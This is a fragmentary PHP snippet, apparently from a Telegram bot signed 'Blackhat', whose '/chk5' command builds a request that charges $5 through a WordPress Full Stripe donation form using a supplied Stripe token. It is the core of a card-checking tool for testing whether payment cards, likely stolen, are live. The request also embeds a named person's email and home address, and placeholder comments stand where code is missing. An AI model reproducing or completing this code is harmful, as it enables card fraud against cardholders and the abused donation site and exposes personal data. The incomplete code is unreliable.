...
////////////====[MUTE]====////////////
if (strpos($message, "/chk5 ") === 0 || strpos($message, "!chk5 ") === 0 && $userId == $config['adminID']) {
...
$data = "action=wp_full_stripe_payment_charge&formName=Donation&fullstripe_name=Avi+verma&fullstripe_email=avilovel2014%40gmail.com&fullstripe_custom_input=&fullstripe_custom_amount=5&fullstripe_address_line1=7215+Skillman+St+%23300&fullstripe_address_line2=&fullstripe_address_city=Dallas&fullstripe_address_state=Texas&fullstripe_address_zip=75231&stripeToken=$id";
...
<b>Bot By: <a href='t.me/+6T-YczOeDyYzYWNk'>Blackhat</a></b>",
            ...
            // Rest of the code for checking and displaying results (unchanged)
            
            // ... (Your existing code for the Stripe API check and result display)
